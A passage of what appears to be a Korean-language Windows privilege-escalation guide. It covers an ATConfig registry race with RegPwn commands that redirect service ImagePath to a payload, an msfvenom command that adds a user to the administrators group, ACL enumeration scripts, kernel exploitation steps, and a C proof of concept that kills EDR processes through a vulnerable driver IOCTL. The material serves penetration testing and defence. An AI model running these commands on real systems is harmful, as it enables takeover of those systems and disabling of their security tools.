### Registry symlink race를 통한 임의 HKLM value write (ATConfig)

일부 Windows 접근성 기능은 사용자별 **ATConfig** 키를 생성하며, 이후 **SYSTEM** 프로세스가 해당 키를 HKLM 세션 키로 복사합니다. Registry **symbolic link race**를 이용하면 이 권한이 높은 쓰기를 **아무 HKLM 경로**로 리디렉션해, 임의의 HKLM **value write** primitive를 얻을 수 있습니다.<sup>[[18]](#references)</sup>

주요 위치(예: 화상 키보드 `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`에는 설치된 접근성 기능이 나열됩니다.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`에는 사용자가 제어하는 구성이 저장됩니다.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`는 로그온/보안 데스크톱 전환 중에 생성되며 사용자가 쓸 수 있습니다.

악용 흐름(CVE-2026-24291 / ATConfig):

1. SYSTEM이 쓰도록 할 값을 **HKCU ATConfig**에 설정합니다.
2. 보안 데스크톱 복사를 트리거합니다(예: **LockWorkstation**). 그러면 AT broker 흐름이 시작됩니다.
3. **race에서 이기려면** `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`에 **oplock**을 설정합니다. oplock이 발동되면 **HKLM Session ATConfig** 키를 보호된 HKLM 대상 경로를 가리키는 **registry link**로 교체합니다.
4. SYSTEM이 리디렉션된 HKLM 경로에 공격자가 지정한 값을 씁니다.

임의 HKLM value write를 확보하면 서비스 구성 값을 덮어써 LPE로 이어갈 수 있습니다.

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/명령줄)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

일반 사용자가 시작할 수 있는 서비스(예: **`msiserver`**)를 선택하고 쓰기 후 트리거합니다. **참고:** 공개된 exploit 구현은 race의 일부로 워크스테이션을 잠급니다.

도구 예시(RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory 권한

레지스트리에 이 권한이 있으면 **해당 레지스트리 아래에 하위 레지스트리를 만들 수 있습니다**. Windows 서비스의 경우, 이것만으로도 **임의의 코드를 실행하기에 충분합니다**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일 경로에 따옴표가 없으면 Windows는 공백이 나오기 전까지의 각 경로를 실행하려고 시도합니다.

예를 들어, 경로가 _C:\Program Files\Some Folder\Service.exe_이면 Windows는 다음 파일들을 실행하려고 시도합니다:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

기본 제공 Windows 서비스에 속하는 항목은 제외하고, 따옴표로 묶이지 않은 모든 서비스 경로를 나열합니다:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploit을 사용해** 이 취약점을 탐지하고 exploit할 수 있습니다: `exploit/windows/local/trusted\_service\_path` metasploit으로 서비스 바이너리를 수동으로 생성할 수 있습니다:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 복구 작업

Windows에서는 사용자가 서비스 실패 시 수행할 작업을 지정할 수 있습니다. 이 기능은 바이너리를 가리키도록 구성할 수 있습니다. 해당 바이너리를 교체할 수 있다면 권한 상승이 가능할 수 있습니다. 자세한 내용은 [공식 문서](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)를 참조하세요.

## 예약된 작업의 스크립트 대상

`.bat` 또는 `.cmd` 파일을 사용해 `cmd.exe /c`를 실행하는 활성화된 작업의 경우, `cmd.exe`뿐 아니라 **action arguments**에 지정된 스크립트도 확인하세요. PowerShell의 `-File`처럼 인터프리터에 파일 인수를 명시적으로 전달하는 경우에도 마찬가지입니다. 예약된 batch file에 PowerShell `-File` 호출이 그대로 포함되어 있다면, 참조된 스크립트의 ACL도 확인하세요. 변수, 조건문, 셸 연결은 수동으로 추적해야 합니다. 호출자가 쓸 수 있는 스크립트나 상위 디렉터리는 구성된 작업 principal이 호출자와 다르고 작업이 실제로 해당 action에 도달하는 경우에만 계정 간 실행 가능성을 보여주는 단서입니다. 스크립트에는 append-only ACL이 중요할 수 있지만, 앞부분의 `exit` 또는 다른 제어 흐름 때문에 추가한 줄이 실행되지 않을 수도 있습니다. 권한 상승이라고 판단하기 전에 유효 ACL, [작업 실행 컨텍스트](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), 작업 디렉터리, 트리거, 애플리케이션 제어 정책을 확인하세요. 인벤토리 작업 중에는 스크립트를 수정하거나 작업을 시작하지 마세요.

## 접근 가능한 파일의 명명된 스트림

NTFS에서는 읽을 수 있는 파일에 명명된 `:$DATA` 스트림이 포함될 수 있으며, 일반 디렉터리 목록에는 해당 스트림의 내용이 표시되지 않습니다. 접근 가능한 백업 또는 구성 파일 중 관련성이 높은 소규모 집합을 대상으로, 내용을 열기 전에 스트림의 **이름과 크기**를 확인하세요. Windows에서는 [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) 및 PowerShell의 [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item)를 통해 이를 확인할 수 있습니다. 비밀을 암시하는 스트림 이름은 단서일 뿐입니다. 파일에 대한 유효 읽기 권한, 파일 시스템의 스트림 지원 여부, 스트림에 사용할 수 있는 자격 증명이 들어 있는지, 해당 자격 증명으로 실제 인증되는 계정을 확인하세요. 일반적인 열거 작업에서는 재귀적으로 스트림을 검색하거나 스트림 내용을 출력하지 마세요.

## 예약된 Windows Driver Kit 헬퍼 입력 파일

선택적으로 설치할 수 있는 Windows Driver Kit에는 실행 디렉터리의 `command.txt`, `reboot.rsf`, 프로젝트의 `working\rsf.rsf` 파일을 읽을 수 있는 `StandaloneRunner.exe`가 포함되어 있습니다. 권한 있는 계정으로 이 헬퍼를 시작하는 예약된 작업이나 서비스가 있으면, 헬퍼 실행 파일 자체가 보호되어 있더라도 권한이 낮은 사용자가 해당 입력 파일에 쓰기 권한을 가질 경우 그 계정의 컨텍스트에서 명령을 실행할 수 있습니다. 권한 있는 소비자가 있는지, **두** 사이드카 파일을 모두 만들거나 수정할 수 있는지 확인하세요. 헬퍼를 발견하는 것만으로는 충분하지 않습니다.

예약된 작업의 경우 action에 지정된 [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory)와 두 사이드카 경로의 ACL을 확인하세요. 작업에 작업 디렉터리가 지정되어 있지 않다면, 실행 파일의 디렉터리는 확인이 필요한 단서일 뿐, 작업이 그곳에서 입력 파일을 읽는다는 증거는 아닙니다. 프로젝트 작업 파일의 필수 조건도 충족되어야 합니다. SYSTEM으로 실행된다고 가정하지 말고 실제 작업 principal을 확인하세요.

## 애플리케이션

### 설치된 애플리케이션

**바이너리의 권한**(덮어써서 권한을 상승할 수 있을 수 있음)과 **폴더**의 권한을 확인하세요([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent 복구 경로

[CVE-2024-0670](https://checkmk.com/werk/16361)은 명령 파일을 `C:\Windows\Temp`에 기록한 뒤, 교체에 실패하면 이미 존재하는 쓰기 보호 파일을 실행하던 구버전 Checkmk Windows agent에 영향을 줍니다. 벤더는 2.1.0p40, 2.2.0p23, 2.3.0b1, 2.4.0b1에서 이 문제를 수정했습니다. 설치된 전체 패치 수준과 영향을 받는 agent 작업을 실행할 수 있는지 확인하세요. `2.1`처럼 브랜치만 표시하는 정보로는 취약 여부를 판단할 수 없습니다. 파일을 만들거나 agent 명령을 실행하지 않고도 버전, 서비스 상태, Temp 권한을 조사할 수 있습니다.

#### ADSelfService Plus SAML 서비스 점검

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html)은 ADSelfService Plus 빌드 6210 이하에 영향을 주며, 벤더는 빌드 6211에서 수정했습니다. SAML SSO가 **현재 또는 과거에 활성화된 경우에만** 관련이 있습니다. 따라서 설치된 제품 항목이나 서비스 경로는 단서일 뿐 취약점 판정 근거가 아닙니다. 정확한 빌드, SAML 설정 이력, 서비스의 네트워크 접근 가능 여부, 서비스 실행 계정을 확인하세요. 서비스를 통한 코드 실행은 해당 계정의 권한을 상속합니다. SYSTEM 권한으로 실행되려면 서비스 인스턴스가 SYSTEM 계정으로 실행 중이어야 합니다. 제품의 Backup 디렉터리에 있는 읽기 가능한 `OfflineBackup_*.ezip`은 별도의 암호화 백업 단서이지, 사용 가능한 자격 증명이나 이 SAML 취약점의 증거가 아닙니다. 일반적인 열거 과정에서는 압축을 풀지 말고 경로와 접근 권한만 기록하세요.

#### Jenkins 컨트롤러와 도메인 계정 경계

Windows Jenkins 컨트롤러에서는 job을 생성하거나 설정할 수 있는 권한과 job을 시작할 수 있는 권한을 구분하세요. [Jenkins 문서에서는 이를 별도의 `Job/Create`, `Job/Configure`, `Job/Build` 권한으로 구분합니다](https://www.jenkins.io/doc/book/security/access-control/permissions/). 설정된 예약 실행이나 원격 트리거가 또 다른 빌드 경로를 제공할 수 있지만, 해당 기능이 활성화되어 있고 빌드가 실제로 실행되는지 확인하세요. 실행은 컨트롤러 또는 선택된 agent의 ID로 이루어지며, 저장된 자격 증명은 job이 해당 자격 증명의 범위에 접근할 수 있을 때만 사용할 수 있습니다. 이와 별도로 `JENKINS_HOME` 메타데이터에 대한 접근을 조사하세요. Jenkins는 자격 증명 정보와 암호화 키를 `credentials.xml`, `secrets/hudson.util.Secret`, `secrets/master.key`에 저장합니다([Jenkins 비밀 정보 저장소](https://www.jenkins.io/doc/developer/security/secrets/)). 해당 파일이 존재한다고 해서 비밀번호를 알 수 있는 것은 아닙니다. 공유 출력에 비밀 정보를 출력하지 말고 **필요한 파일에 대한 읽기 권한**과 별도의 계정 재사용 경로가 있는지 확인하세요. 해당 계정에 AD 사용자 객체의 `scriptPath` 쓰기 권한이 있다면, 이를 사용자 간 실행으로 판단하기 전에 스크립트 경로에 쓸 수 있는지, 대상 사용자로 실행되는 실제 로그온 또는 예약 작업 소비자가 있는지 확인하세요. 추가적인 그룹 제어 권한은 유효한 AD 권한을 별도로 검증해야 합니다.

#### Azure Pipelines self-hosted agent ID

Azure DevOps Server 또는 Azure Pipelines 프로젝트에서는 파이프라인을 **생성하거나 편집**할 수 있는 권한과 파이프라인을 **대기열에 추가**하고 선택한 agent pool을 사용할 수 있는 권한을 구분하세요. [Microsoft는 파이프라인 권한](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)과 [pool 권한 부여](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)를 별도로 설명합니다. 권한이 낮은 계정으로 script step을 제출하고 해당 파이프라인을 self-hosted Windows agent에서 실행할 수 있다면, 그 step은 [agent에 설정된 운영체제 계정](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)으로 실행됩니다. 사용자 간 또는 SYSTEM 권한 전환이라고 판단하기 전에 정확한 파이프라인, 브랜치/리소스 제한, 승인된 pool, 실행 가능한 job, agent 서비스 ID를 확인하세요. agent 설치 여부, 프로젝트 역할, 저장소 쓰기 권한만으로는 단서일 뿐입니다. 수동 열거 중에는 빌드를 시작하지 말고 권한과 로컬 서비스 메타데이터를 검토하세요.

#### Microsoft Entra Connect Sync 자격 증명

[Microsoft는](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) 동기화 서비스를 실행하고 SQL 데이터베이스에 접근하는 **ADSync 서비스 계정**과, 권한이 설정된 동기화 기능에 따라 달라지는 디렉터리 권한을 가진 **AD DS connector 계정**을 구분합니다. Connector 자격 증명은 해당 데이터베이스에 암호화된 상태로 저장되며, 키 자료는 [ADSync 서비스 계정의 DPAPI로 보호됩니다](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). 동기화 서비스 설치 여부, 로컬 관리자 권한을 연상시키는 그룹, 데이터베이스의 가시성만으로는 복호화 가능한 자격 증명이나 도메인 권한 상승이 입증되지 않습니다. 실제 데이터베이스 읽기 권한, 서비스 계정/키 접근 권한, 설치 및 SQL 구성, 설정된 connector ID, 해당 ID의 유효한 AD 권한을 각각 검토하세요. 일반적인 열거 결과에는 서비스 및 접근 메타데이터만 표시하고, 저장된 비밀 정보를 조회하거나 출력하지 마세요.

#### 프린터 드라이버 지원 DLL 권한

설치된 프린터 드라이버는 `C:\ProgramData` 아래에 지원 DLL을 두고, 더 높은 권한의 인쇄 프로세스에서 이를 로드할 수 있습니다. 프린터 WMI 열거가 거부되더라도 상위 디렉터리와 reparse point를 포함해 정확한 드라이버 디렉터리 및 DLL ACL을 검토하세요. [Ricoh 프린터 드라이버 문제 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1)의 보고된 경로는 `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`였습니다. [최초 공개 자료](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)에는 `PrintIsolationHost.exe`가 DLL을 로드하는 것으로 설명되어 있습니다. 쓰기 가능한 ACL은 단서일 뿐입니다. 거부 항목을 적용한 뒤의 유효 쓰기 권한, 해당 드라이버의 설치 여부와 권한이 높은 ID로 파일을 로드하는지, 벤더의 업데이트된 드라이버나 보안 프로그램이 해당 설치를 수정했는지 확인하세요. 디렉터리 이름이나 드라이버 버전만으로 취약하다고 단정하지 마세요.

### 쓰기 권한

특정 파일을 읽을 수 있도록 설정 파일을 수정할 수 있는지, 또는 Administrator 계정으로 실행될 바이너리(schedtasks)를 수정할 수 있는지 확인하세요.

시스템에서 권한이 취약한 폴더/파일을 찾는 방법은 다음과 같습니다.

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ 플러그인 자동 로드 지속성/실행

Notepad++는 `plugins` 하위 폴더에 있는 모든 플러그인 DLL을 자동으로 로드합니다. 쓰기 가능한 portable/복사본 설치가 있다면 악성 플러그인을 넣어 실행할 때마다 `notepad++.exe` 내부에서 자동으로 코드를 실행할 수 있습니다(`DllMain` 및 플러그인 콜백 포함).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 시작 시 실행

**다른 사용자가 실행할 레지스트리 항목이나 바이너리를 덮어쓸 수 있는지 확인하세요.**\
**권한 상승에 이용할 수 있는 흥미로운 autoruns 위치**에 대해 자세히 알아보려면 **다음 페이지**를 **읽으세요**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 드라이버

**타사 취약/수상한** 드라이버가 있는지 찾아보세요.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

드라이버가 임의의 kernel read/write primitive(잘못 설계된 IOCTL handler에서 흔함)를 노출한다면, kernel memory에서 SYSTEM token을 직접 훔쳐 권한을 상승시킬 수 있습니다.<sup>[[13]](#references)</sup> 단계별 기법은 여기에서 확인하세요:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

취약한 호출이 공격자가 제어하는 Object Manager 경로를 여는 race-condition 버그의 경우, 조회를 의도적으로 느리게 만들면(최대 길이의 구성 요소나 깊은 디렉터리 체인 사용) 경쟁 가능 구간을 마이크로초에서 수십 마이크로초까지 늘릴 수 있습니다:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF, paged-pool 정보 노출, I/O ring 피벗

일부 Windows kernel LPE 체인은 각각만으로는 약한 두 가지 버그를 조합해 만들 수 있습니다. 하나는 queue lock이 잡혀 있는 동안 request/CBD를 해제하는 **cancel-safe queue 수명 race**이고, 다른 하나는 `RtlCopyToUser` 중 해제된 paged-pool 할당을 노출하는 **복사 전 lock 해제** 정보 노출입니다.<sup>[[29]](#references)</sup>

감사 및 익스플로잇 참고 사항:

- **lock을 잡은 채 해제한 후 취소 처리**: 성공 경로가 **Acquire -> CompleteRequest/free -> Release**를 수행하고, 취소 경로가 **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**를 수행하는지 살펴보세요. 성공 경로가 CBDQ/CSQ lock을 해제하기 전에 `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`에 도달하면, `NtCancelIoFileEx -> IopCsqCancelRoutine`에서 대기하던 스레드가 나중에 재개되어 해제된 `PFLT_CALLBACK_DATA`를 드라이버의 remove callback에 전달할 수 있습니다.
- 같은 크기의 공격자 제어 paged-pool 할당으로 **해제된 queue 객체를 재확보**하세요. `NPFS` Data Queue Entries는 payload와 크기를 제어할 수 있고, 이후 pipe read/peek 작업으로 조사할 수 있어 유용합니다. 해제된 객체에 list link가 포함되어 있다면, 이를 **사용자 메모리의 순환형 가짜 request node 목록**으로 덮어써 드라이버가 원래 list head에서 종료되는 대신 공격자가 정의한 request 구조체를 반복해서 처리하도록 하세요.
- **예측 가능한 쓰기를 업그레이드**하세요: 가짜 request가 bookkeeping write(timestamp / QPC / refcount 인접 필드)에 사용되는 중첩 context pointer를 바꾼다면, **주소는 제어할 수 있지만 값은 제어할 수 없는** kernel write를 얻을 수 있습니다. 이 경우 최종 code/data pointer 대신 spray된 pool 객체의 **length/size** 필드를 노린 다음, 손상된 객체가 **범위를 벗어난 paged-pool read**를 제공할 때까지 spray를 열거하세요.
- **race 가능한 정보 노출 패턴**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`를 수행하는 syscall은 모두 유력한 후보입니다. 공격자가 복사되는 buffer를 키울 수 있다면(예: serializer의 최종 할당 크기를 늘리는 list/resource 항목을 다수 추가), 복사 시간이 길어져 시스템을 반드시 충돌시키지 않으면서 교체 가능 구간이 넓어지므로 안정성이 향상됩니다.
- **포인터가 많은 재충전 대상**: Windows **I/O ring** 등록 buffer 배열은 paged-pool 크기(`8 * regBufferCnt`)를 공격자가 제어할 수 있고 각 요소가 `_IOP_MC_BUFFER_ENTRY`를 가리키는 kernel pointer이므로 정보 노출 대상으로 적합합니다. 이 배열을 유출하고 주변의 `IORING_OBJECT`를 찾아낸 다음 **`RegBuffers`**와 **`RegBuffersCount`**를 손상시켜 후속 I/O ring 작업이 공격자가 위조한 항목을 사용하고 임의의 kernel read/write를 제공하도록 하세요. 사용 가능한 쓰기가 안정적인 byte(예: `KUSER_SHARED_DATA+0x14`)만 제공한다면 **겹치는 비정렬 쓰기**로 `0x0101010101010101` 같은 반복 byte 사용자 포인터를 만들고, `VirtualAlloc`으로 매핑한 뒤 위조한 등록 buffer 배열을 그곳에 배치하세요.<sup>[[30]](#references)</sup>

유용한 디버깅 지표:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

손상된 I/O ring에서 임의의 kernel read/write를 확보한 후, 표준 post-primitive 워크플로를 사용해 SYSTEM token을 탈취합니다.

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive 메모리 손상 primitives

최신 hive 취약점을 이용하면 결정론적 레이아웃을 조성하고, 쓰기 가능한 HKLM/HKU 하위 키를 악용하며, 커스텀 드라이버 없이 메타데이터 손상을 kernel paged-pool overflow로 전환할 수 있습니다. 전체 공격 체인은 여기에서 확인하세요.

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 공격자가 제어하는 경로에서 발생하는 `RtlQueryRegistryValues` direct-mode type confusion

일부 드라이버는 userland에서 레지스트리 경로를 받아 유효한 UTF-16 문자열인지 여부만 확인한 뒤, `RTL_QUERY_REGISTRY_DIRECT`를 사용해 `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)`를 스택 스칼라 변수(예: `int readValue`)에 호출합니다. `RTL_QUERY_REGISTRY_TYPECHECK`가 빠져 있으면 `EntryContext`는 개발자가 예상한 형식이 아니라 **실제** 레지스트리 형식에 따라 해석됩니다.

이로 인해 두 가지 유용한 primitives가 발생합니다:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: 사용자가 제어하는 절대 `\Registry\...` 경로를 통해 드라이버가 공격자가 선택한 키를 조회할 수 있습니다. 반환 코드나 로그를 통해 키의 존재 여부가 노출되고(leak), 때로는 호출자가 직접 접근할 수 없는 값도 읽을 수 있습니다.
- **Kernel 메모리 손상**: `&readValue`와 같은 스칼라 대상이 레지스트리 값 형식에 따라 `REG_QWORD`, `UNICODE_STRING` 또는 크기가 지정된 바이너리 버퍼로 type confusion됩니다.

실전 악용 참고 사항:

- **Windows 8+ 완화 조치**: 쿼리가 `RTL_QUERY_REGISTRY_DIRECT`를 사용하면서 `RTL_QUERY_REGISTRY_TYPECHECK` 없이 **untrusted hive**를 대상으로 하면, kernel caller에서 `KERNEL_SECURITY_CHECK_FAILURE (0x139)`가 발생하며 crash됩니다. 악용 가능성을 유지하려면 `HKCU`에 값을 준비하는 대신 **trusted system hive 내부의 공격자가 쓸 수 있는 키**를 찾으세요.
- **Trusted-hive staging**: NtObjectManager를 사용해 `\Registry\Machine` 아래의 쓰기 가능한 하위 키를 열거한 뒤, 복제한 **low-integrity** token으로 스캔을 다시 실행해 sandboxed 컨텍스트에서 접근 가능한 키를 찾으세요:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4바이트 `int`에 8바이트를 직접 쓰면 인접한 스택 데이터가 손상되고, 근처의 callback/function pointer를 부분적으로 덮어쓸 수 있습니다.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode에서는 `EntryContext`가 `UNICODE_STRING`을 가리킨다고 가정합니다. 코드가 먼저 공격자가 제어하는 `REG_DWORD`를 스택 scalar에 로드한 다음, 동일한 버퍼를 문자열 읽기에 재사용하면 공격자가 `Length`/`MaximumLength`를 제어하고 `Buffer` pointer에도 부분적으로 영향을 주어 어느 정도 제어 가능한 kernel write가 발생합니다.
- **`REG_BINARY`**: 큰 binary data의 경우 direct mode는 `EntryContext`의 첫 번째 `LONG`을 signed buffer size로 처리합니다. 이전 `REG_DWORD` 읽기가 재사용된 scalar에 공격자가 제어하는 **negative** 값을 남기면, 다음 `REG_BINARY` query가 공격자 바이트를 인접한 스택 슬롯에 직접 복사합니다. 이는 callback-pointer를 완전히 덮어쓰는 가장 간단한 방법인 경우가 많습니다.

강력한 탐색 패턴: **초기화하지 않은 동일한 스택 변수를 사용해 서로 다른 형식의 registry read를 수행하는 경우**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, 재사용되는 `EntryContext` pointer, 그리고 첫 번째 registry read가 두 번째 read의 실행 여부를 제어하는 코드 경로를 검색하세요.

#### Device object에서 FILE_DEVICE_SECURE_OPEN 누락 악용 (LPE + EDR kill)

일부 서명된 third-party driver는 IoCreateDeviceSecure로 강력한 SDDL을 사용해 device object를 생성하지만, DeviceCharacteristics에 FILE_DEVICE_SECURE_OPEN을 설정하지 않습니다. 이 flag가 없으면 경로에 추가 구성 요소가 포함된 device를 열 때 secure DACL이 적용되지 않아, 권한이 없는 사용자도 다음과 같은 namespace path를 사용해 handle을 얻을 수 있습니다:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (실제 사례)

사용자가 device를 열 수 있게 되면, driver가 노출하는 privileged IOCTL을 악용해 LPE 및 tampering을 수행할 수 있습니다. 실제 환경에서 확인된 기능의 예:
- 임의의 process에 대한 full-access handle 반환 (token theft / DuplicateTokenEx/CreateProcessAsUser를 통한 SYSTEM shell).
- 제한 없는 raw disk read/write (offline tampering, boot-time persistence 기법).
- Protected Process/Light (PP/PPL)를 포함한 임의의 process 종료. 이를 통해 user land에서 kernel을 이용해 AV/EDR kill 가능.

최소 PoC 패턴 (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

개발자를 위한 완화 방법
- DACL로 제한하려는 디바이스 객체를 생성할 때는 항상 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- 권한이 필요한 작업에서는 호출자의 컨텍스트를 검증하세요. 프로세스 종료나 핸들 반환을 허용하기 전에 PP/PPL 검사를 추가하세요.
- IOCTL(액세스 마스크, METHOD_*, 입력 검증)을 제한하고, 커널 권한을 직접 사용하는 대신 brokered 모델을 고려하세요.

방어자를 위한 탐지 아이디어
- 의심스러운 디바이스 이름(예: \\ .\\amsdk*)에 대한 사용자 모드 열기와 악용을 나타내는 특정 IOCTL 시퀀스를 모니터링하세요.
- Microsoft의 취약한 드라이버 차단 목록(HVCI/WDAC/Smart App Control)을 적용하고 자체 허용/차단 목록을 유지하세요.


## PATH DLL Hijacking

**PATH에 포함된 폴더 내 쓰기 권한**이 있으면 프로세스가 로드하는 DLL을 하이재킹해 **권한을 상승**시킬 수 있습니다.<sup>[[2]](#references)</sup>

PATH에 포함된 모든 폴더의 권한을 확인하세요:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

이 검사를 악용하는 방법에 대한 자세한 내용은 다음을 참고하세요:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules`를 통한 Node.js / Electron module resolution hijacking

이는 **Node.js** 및 **Electron** 애플리케이션에서 `require("foo")`와 같이 모듈 이름만 지정해 import하고, 예상한 모듈이 **없는** 경우 영향을 미치는 **Windows uncontrolled search path** 변형입니다.<sup>[[20]](#references)</sup>

Node는 디렉터리 트리를 따라 상위 디렉터리의 `node_modules` 폴더를 차례로 확인하며 패키지를 찾습니다. Windows에서는 이 탐색이 드라이브 루트까지 이어질 수 있으므로, `C:\Users\Administrator\project\app.js`에서 실행된 애플리케이션은 다음 경로를 확인할 수 있습니다.<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

